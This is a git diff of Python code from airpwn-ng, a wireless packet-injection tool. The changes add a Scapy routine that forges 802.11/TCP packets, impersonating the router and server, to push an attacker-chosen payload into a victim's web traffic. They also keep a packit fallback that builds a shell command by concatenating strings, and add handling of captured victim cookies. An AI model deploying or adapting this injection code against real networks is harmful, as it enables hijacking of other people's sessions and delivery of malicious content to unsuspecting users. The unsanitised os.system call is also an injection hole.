@@ -1,6 +1,10 @@
 from threading import Thread
 from Queue import Queue, Empty
 from scapy.all import *
+import gzip
+from cStringIO import StringIO
+import binascii
+
 
 class bcolors:
     HEADER = '\033[95m'
@@ -56,12 +60,39 @@ class VictimParameters:
 	        if (proceed==0):
 	                print bcolors.WARNING+"[!] You have a file named TEMPLOG in this directory. Please rename it, as it is used by airpwn-ng for payload generation"
 	                exit(1)
-	
+		f = open(injectionfile,'r')
+		try:
+			data=f.read()
+		finally:
+			f.close()
+		return data
+		#GZIP
+#		f = open(injectionfile,'r')
+#		try:
+#			data=f.read()
+#		finally:
+#			f.close()
+#		buf = StringIO()
+#		f = gzip.GzipFile(mode='wb', fileobj=buf)
+#		try:
+#			f.write(data)
+#		finally:
+#			f.close()
+#		compressed_data=buf.getvalue()
+#		k=binascii.hexlify(compressed_data)
+#		n=2
+#		inject="0x"
+#		for item in [k[i:i+n] for i in range(0, len(k), n)]:
+#			inject+=item+" "
+#		print inject
+
 	        #Uses bash to hex encode payload (--by stryngs)
+#	        cmd='''echo "0x$(cat TEMP_GZIP | xxd -g1 -ps | fold -w2 | paste -sd ' ')" > TEMPLOG'''
 	        cmd='''echo "0x$(cat '''+injectionfile+''' | xxd -g1 -ps | fold -w2 | paste -sd ' ')" > TEMPLOG'''
 	        os.system(cmd)
 	        f = open('TEMPLOG','r')
 	        inject=f.read().strip()
+#		print inject
 	        f.close()
 	        os.system("rm TEMPLOG")
 	        return inject
@@ -85,7 +116,6 @@ class VictimParameters:
 	        f.write(injects)
 	        f.write('</div>')
 	        f.close()
-	        global injection
 	        injection=self.load_injection('INJECTS_TEMP')
 #	        os.system("cat INJECTS_TEMP")
 	        os.system("rm INJECTS_TEMP")
@@ -185,14 +215,40 @@ class Injector:
 	def __init__(self,interface):
 		self.interface=interface
 
-	#TODO: CHANGE OS.SYSTEM CALL TO SUBPROCESS POPEN SO YOU CAN CHECK PACKIT'S RET CODE HANDLE IT
 	def inject(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection):
-		cmd='nice -n -20 packit -i '+self.interface+' -R -nnn -a '+str(acknum)+' -D '+str(vicport)+' -F PA -q '+str(seqnum)+' -S '+str(svrport)+' -d '+vicip+' -s '+svrip+' -X '+rtrmac+' -Y '+vicmac+' -p "'
-		cmd+=injection
-		#TODO: ALLOW FOR DEBUG MODE WHERE YOU CAN SEE PACKIT'S OUTPUT
-		cmd+='" >/dev/null 2>&1'
 		print bcolors.OKBLUE+"[*] Injecting Packet to victim "+vicmac+bcolors.ENDC
-		os.system(cmd)
+#		os.system(cmd)
+#		print injection
+		if ("mon" in self.interface):
+			packet=RadioTap()/Dot11(FCfield='from-DS',addr1=vicmac,addr2=rtrmac,addr3=rtrmac)/LLC()/SNAP()/IP(dst=vicip,src=svrip)/TCP(flags="PA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum))/Raw(load=injection)
+			try:
+				sendp(packet,iface=self.interface,verbose=0)
+	#			sendp(FIN,iface=self.interface,verbose=0)
+			except:
+				raise
+		else:
+			k=binascii.hexlify(injection)
+			n=2
+			inject="0x"
+			for item in [k[i:i+n] for i in range(0, len(k), n)]:
+				inject+=item+" "
+			injection=inject
+			cmd='nice -n -20 packit -i '+self.interface+' -R -nnn -a '+str(acknum)+' -D '+str(vicport)+' -F PA -q '+str(seqnum)+' -S '+str(svrport)+' -d '+vicip+' -s '+svrip+' -X '+rtrmac+' -Y '+vicmac+' -p "'
+			cmd+=injection
+			cmd+='" >/dev/null 2>&1'
+			os.system(cmd)
+
+#			packet=RadioTap()/Dot11(FCfield='to-DS',type='Data',addr1=rtrmac,addr2="94:db:c9:b7:da:c0",addr3=vicmac)/LLC()/SNAP()/IP(dst=vicip,src=svrip)/TCP(flags="PA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum))/Raw(load=injection)
+#			try:
+#				sendp(packet,iface=self.interface,verbose=1)
+	#			sendp(FIN,iface=self.interface,verbose=0)
+#			except:
+#				raise
+#			packet=RadioEther(dst=vicmac,src=rtrmac)/IP(dst=vicip,src=svrip)/TCP(flags="PA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum))/Raw(load=injection)
+#		FIN=RadioTap()/Dot11(FCfield='to-DS',addr1=rtrmac,addr2=vicmac,addr3=rtrmac)/LLC()/SNAP()/IP(dst=svrip,src=vicip)/TCP(sport=vicport, dport=svrport, flags="FA", ack=seqnum+1, seq = acknum)
+#		packet=Ether(src=rtrmac,dst=vicmac)/IP(dst=vicip,src=svrip)/TCP(flags="PA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum))/Raw(load=injection)
+#		print cmd
+		
 
 
 class PacketHandler:
@@ -292,6 +348,10 @@ class PacketHandler:
 			except:
 				return
 			if (len(self.victims)==0):
+				try:
+					k=cookie[1]
+				except:
+					cookie=("NONE","NONE")
 				if (cookie[1] is not None):
 					exists=0
 					for victim in self.newvictims:
